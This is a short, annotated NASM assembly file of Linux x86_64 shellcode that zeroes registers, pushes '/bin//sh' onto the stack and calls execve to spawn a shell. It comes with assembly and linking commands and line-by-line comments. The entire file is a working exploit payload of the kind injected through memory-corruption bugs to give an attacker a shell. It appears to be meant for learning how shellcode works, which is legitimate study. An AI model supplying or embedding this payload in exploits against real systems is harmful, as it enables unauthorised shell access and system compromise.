; lnx-execve-x86_64.s
; Linux EXECVE(2) shellcode for x86_64 instruction set.
; Written by e3prom (github.com/e3prom)
;
; nasm -f elf64 lnx-execve-x86_64.s
; ld lnx-execve-x86_64.o -o lnx-execve-x86_64
; objdump -d lnx-execve-x86_64
BITS 64

section .text
  global _start

  _start:
    ; EXECVE(2) - execute program
    ;             int execve(const char *filename, char *const argv[], char *const envp[]);
    xor eax, eax			; Zero out RAX (XOR EAX here is enough on 64-bits).
    push rax				; Push RAX onto the stack - or null register.
    mov qword rbx, 0x68732f2f6e69622f	; Move into RBX the qword of the filename - python: '/bin//sh'[::-1].encode('hex').
    push rbx				; Push RBX into the stack.
    mov rdi, rsp			; Move RSP to RDI (argv1) to point to the top of the stack where the filename has been pushed.
    push rax				; Push RAX onto the stack, RAX is zero, so the null register at that position.
    mov rsi, rsp			; Move RSP to RSI (argv2) to point to the top of the stack where the pushed null register is.
    push rdi				; Push the value of RDI which is the memory address of the filename onto the stack.
    mov rdx, rsp			; Move RSP to RDX (argv3) to point to the top of the stack where the filename's memory address pushed is.
    mov al, 0x3b			; Move '0x3b' to AL/EAX/RAX (execve syscall number).
    syscall				; Peform system call.
